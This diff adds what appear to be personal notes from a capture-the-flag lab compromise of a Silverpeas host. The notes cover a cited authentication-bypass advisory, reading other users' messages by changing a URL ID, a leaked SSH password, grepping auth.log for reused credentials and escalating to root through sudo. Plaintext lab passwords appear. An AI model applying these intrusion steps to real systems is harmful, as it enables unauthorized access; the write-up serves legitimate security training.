@@ -1,0 +1,98 @@
+
+
+
+
+http://10.201.103.227/#contact
+
+
+If you'd like to get in touch with us, please reach out to our project manager on 
+Silverpeas. His username is "scr1ptkiddy".
+
+
+http://10.201.103.227:8080/silverpeas/defaultLogin.jsp
+
+
+https://github.com/advisories/GHSA-4w54-wwc9-x62c
+Silverpeas before 6.3.5 allows authentication bypass by omitting the Password field to AuthenticationServlet, 
+often providing an unauthenticated user with superadmin access.
+
+
+we have unread messages:
+10.201.103.227:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5
+
+change in ip
+
+we change ID=6
+
+Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
+
+Username: tim
+
+Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh tim@10.201.56.194   
+The authenticity of host '10.201.56.194 (10.201.56.194)' can't be established.
+ED25519 key fingerprint is SHA256:6AsrTX0s/rxmcFoKUT6GY1IfzaYhHZCbwgmMiroWbDs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.56.194' (ED25519) to the list of known hosts.
+tim@10.201.56.194's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+...
+Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
+tim@ip-10-201-56-194:~$ 
+
+
+tim@ip-10-201-56-194:/home$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+tim@ip-10-201-56-194:/home$ 
+
+The adm group on Linux is a system group that allows its members to read many log files in /var/log (such as syslog, auth.log, dmesg, etc.). It is commonly used for system monitoring and auditing.
+
+If your user is in the adm group, you can view restricted logs without needing root. This can sometimes help with privilege escalation or information gathering.
+
+
+
+tim@ip-10-201-56-194:/var/log$ grep -i password /var/log/auth.log.2
+Dec 12 19:34:46 silver-platter passwd[1576]: pam_unix(passwd:chauthtok): password changed for tim
+Dec 12 19:39:15 silver-platter sudo:    tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
+Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
+Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
+Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
+Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
+Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
+Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
+Dec 13 16:17:31 silver-platter passwd[6811]: pam_unix(passwd:chauthtok): password changed for tim
+Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
+Dec 13 16:32:54 silver-platter passwd[7174]: pam_unix(passwd:chauthtok): password changed for tim
+Dec 13 16:33:12 silver-platter sshd[7181]: Accepted password for tim from 192.168.1.20 port 50970 ssh2
+tim@ip-10-201-56-194:/var/log$ 
+
+
+tim@ip-10-201-56-194:/var/log$ su tyler
+Password: 
+tyler@ip-10-201-56-194:/var/log$ 
+
+
+tyler@ip-10-201-56-194:~$ sudo -l
+[sudo] password for tyler: 
+Matching Defaults entries for tyler on ip-10-201-56-194:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on ip-10-201-56-194:
+    (ALL : ALL) ALL
+tyler@ip-10-201-56-194:~$ sudo /bin/bash -p
+root@ip-10-201-56-194:/home/tyler# 
+
+
+
+
+
+
+
+
+
